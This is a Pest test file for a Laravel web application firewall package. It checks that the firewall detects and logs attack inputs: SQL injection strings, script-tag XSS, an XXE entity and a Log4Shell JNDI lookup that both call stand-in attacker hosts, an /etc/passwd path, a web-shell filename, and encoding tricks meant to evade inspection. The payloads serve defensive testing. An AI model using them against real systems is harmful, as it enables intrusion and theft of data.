<?php

use Illuminate\Http\Request;
use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\DB;
use Tuijncode\LaravelWaf\Services\WafInspector;

it('inspects the POST body', function () {
    $this->post('/', ['q' => "' OR 1=1 --"])->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->category)->toBe('sqli')
        ->and($log->rule_ids)->toContain('942120')
        ->and($log->method)->toBe('POST');
});

it('inspects an overwritten duplicate query parameter', function () {
    $this->get('/?q='.rawurlencode('<script>alert(1)</script>').'&q=safe')->assertOk();

    expect(DB::table('waf_logs')->value('rule_ids'))->toContain('941100');
});

it('inspects a raw XML body for XXE', function () {
    $xml = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://attacker.example/xxe">]><r>&x;</r>';

    $this->call('POST', '/', [], [], [], ['CONTENT_TYPE' => 'application/xml'], $xml)->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->category)->toBe('xxe')
        ->and($log->rule_ids)->toContain('944100');
});

it('inspects request headers', function () {
    $this->get('/', ['X-Forwarded-Host' => '${jndi:ldap://evil.example/a}'])->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->rule_ids)->toContain('944150');
});

it('inspects every client header and repeated value', function () {
    $payload = '${jndi:ldap://evil.example/a}';

    foreach (['Host', 'Accept-Language'] as $name) {
        $request = Request::create('/', 'GET');
        $request->headers->set($name, $payload);
        expect(app(WafInspector::class)->inspect($request)->ruleIds())->toContain('944150');
    }

    $request = Request::create('/', 'GET');
    $request->headers->set('X-Trace', ['safe-one', 'safe-two', $payload]);
    expect(app(WafInspector::class)->inspect($request)->ruleIds())->toContain('944150');
});

it('inspects cookies', function () {
    $this->withUnencryptedCookie('sid', "' UNION SELECT password FROM users")
        ->get('/')
        ->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->rule_ids)->toContain('942100');
});

it('inspects the URL path', function () {
    $this->get('/etc/passwd')->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->category)->toBe('lfi')
        ->and($log->rule_ids)->toContain('930110');
});

it('still inspects the other fields when one field holds invalid UTF-8', function () {
    // "\xC3\x28" is a truncated UTF-8 sequence. Without JSON_INVALID_UTF8_SUBSTITUTE
    // it makes json_encode return false, silently blanking the parsed surface —
    // an attacker could append such a byte to any field to blind the WAF.
    $this->post('/', ['junk' => "\xC3\x28", 'q' => "' OR 1=1 --"])->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->category)->toBe('sqli')
        ->and($log->rule_ids)->toContain('942120');
});

it('inspects parsed JSON fields, defeating \u003c-style escape evasion', function () {
    // JSON_HEX_TAG escapes the angle brackets as \u003c / \u003e, so the raw
    // body never contains a literal "<script" — only parsing the JSON bag
    // reveals the payload.
    $payload = (string) json_encode(['q' => '<script>alert(1)</script>'], JSON_HEX_TAG);

    $this->call('POST', '/', [], [], [], ['CONTENT_TYPE' => 'application/json'], $payload)->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->category)->toBe('xss')
        ->and($log->rule_ids)->toContain('941100');
});

it('inspects the client names of uploaded files', function () {
    $upload = UploadedFile::fake()->create('c99.php', 1);

    $this->post('/', ['doc' => $upload])->assertOk();

    $log = DB::table('waf_logs')->first();

    expect($log)->not->toBeNull()
        ->and($log->type)->toContain('Web Shell Signature');
});

it('inspects a text field sharing a parent with an uploaded file', function () {
    $this->post('/', [
        'post' => [
            'file' => UploadedFile::fake()->create('document.txt', 1),
            'title' => '<script>alert(1)</script>',
        ],
    ])->assertOk();

    expect(DB::table('waf_logs')->value('rule_ids'))->toContain('941100');
});
